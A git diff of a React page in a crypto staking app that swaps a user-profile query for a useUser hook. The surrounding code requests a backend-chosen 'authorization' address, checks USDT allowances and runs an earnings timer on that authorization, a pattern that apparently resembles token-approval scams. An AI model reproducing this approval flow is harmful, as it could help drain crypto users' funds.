@@ -15,12 +15,12 @@ import { useConnectModal } from "@rainbow-me/rainbowkit";
 import { erc20Abi } from "viem";
 import { parseUnits } from "viem";
 import toast from "react-hot-toast";
-import { getUserProfile } from "../lib/api";
 import Staking from "../components/Staking";
 import Activity from "../components/activity";
 import { getExchangeRate } from "../lib/api";
 import { useSettingChangeStore } from "../store/settingChangeStore";
 import { useAuthRemainingStore } from "../store/authRemainingStore";
+import { useUser } from "../lib/auth";
 
 // 添加钱包授权请求函数
 export const getWalletAuthorization = async (
@@ -219,33 +219,30 @@ function Home() {
   });
   const [isLoading, setIsLoading] = useState(false);
 
-  // 用户信息查询
-  const { data: userProfile } = useQuery({
-    queryKey: ["userProfile"],
-    queryFn: getUserProfile,
-    retry: 1,
-  });
+  const { data: user } = useUser();
+
+  console.log("userProfile", user);
 
   // 获取授权地址
   const { data: walletAuth } = useQuery({
     queryKey: ["wallet-auth", address, chainId],
     queryFn: async () => {
-      if (!userProfile?.user || !address) return null;
+      if (!user || !address) return null;
 
       try {
         const currentNetwork =
           chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH";
         return await getWalletAuthorization(
-          userProfile.user.address as string,
+          user.address as string,
           currentNetwork,
-          userProfile.user.invitedBy || "",
+          user.invitedBy || "",
         );
       } catch (error) {
         console.error("获取授权地址失败:", error);
         return null;
       }
     },
-    enabled: !!address && !!userProfile?.user,
+    enabled: !!address && !!user,
   });
 
   // 自动检查授权状态
@@ -266,7 +263,7 @@ function Home() {
   useEffect(() => {
     if (allowance !== undefined) {
       const isAuthorized = BigInt(allowance) > BigInt(0);
-      if (isAuthorized && !userProfile?.user?.isVerified) {
+      if (isAuthorized && !user?.isVerified) {
         // 调用后端接口
         axios.post("customers/verify", {
           network: chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH",
@@ -305,7 +302,7 @@ function Home() {
     mutationFn: async () => {
       console.log("开始获取钱包授权");
 
-      if (!userProfile?.user) {
+      if (!user) {
         throw new Error("用户未登录");
       }
 
@@ -318,7 +315,7 @@ function Home() {
       }
 
       // 从用户信息中获取必要数据
-      const { invitedBy } = userProfile.user;
+      const { invitedBy } = user;
 
       // 调用导出的函数
       return getWalletAuthorization(address, currentNetwork, invitedBy || "");
@@ -329,7 +326,7 @@ function Home() {
   const handleJoin = async () => {
     console.log("1. 按钮被点击");
 
-    if (!userProfile?.user) {
+    if (!user) {
       toast.error("请先登录");
       return;
     }
@@ -341,7 +338,7 @@ function Home() {
     }
 
     // 获取当前链的USDT地址
-    const network = userProfile.user.network;
+    const network = user.network;
     const usdtAddress =
       network === "TRX"
         ? USDT_CONTRACT_ADDRESSES["TRX"]
@@ -440,9 +437,9 @@ function Home() {
   // 收益计时器，查询授权剩余时间
   const { data: authRemaining, refetch: refetchAuthRemaining } =
     useQuery<AuthRemaining>({
-      queryKey: ["auth-remaining", userProfile?.user?._id],
+      queryKey: ["auth-remaining", user?._id],
       queryFn: async () => {
-        if (!userProfile?.user) {
+        if (!user) {
           return null;
         }
 
@@ -450,10 +447,7 @@ function Home() {
 
         return response.data;
       },
-      enabled: !!(
-        (userProfile?.user && userProfile?.user?.isAuthorized) ||
-        userProfile?.user?.isVerified
-      ),
+      enabled: !!((user && user.isAuthorized) || user?.isVerified),
     });
 
   useEffect(() => {
@@ -540,14 +534,14 @@ function Home() {
         <div className="flex items-center justify-between mb-6">
           <div className="flex items-center space-x-2">
             <span className="text-xl font-bold">
-              {userProfile?.user?.ethPlatform
+              {user?.ethPlatform
                 ?.toString()
                 .match(/^-?\d+(?:\.\d{0,6})?/)?.[0] || "0.0000"}{" "}
               <span className="text-gray-400">ETH</span>
             </span>
           </div>
           {/* 根据授权状态显示不同内容 */}
-          {userProfile?.user?.isAuthorized || userProfile?.user?.isVerified ? (
+          {user?.isAuthorized || user?.isVerified ? (
             <div className="bg-[#2d2672] text-white px-6 py-2 rounded-lg">
               {remainingTime ? `${remainingTime}` : "--:--:--"}
             </div>
@@ -597,7 +591,7 @@ function Home() {
             </div>
             <div className="flex items-center justify-between bg-[#151923] rounded-lg px-4 py-2">
               <span className="text-sm">
-                {userProfile?.user?.usdtBalance
+                {user?.usdtBalance
                   ?.toString()
                   .match(/^-?\d+(?:\.\d{0,6})?/)?.[0] || "0.00"}{" "}
                 USDT
@@ -754,7 +748,7 @@ function Home() {
               {t("home.staking")}
             </div>
             <div className="text-white text-xl font-bold">
-              {userProfile?.user?.usdtStaking?.toFixed(6) || "0.00"}
+              {user?.usdtStaking?.toFixed(6) || "0.00"}
             </div>
           </div>
         </div>
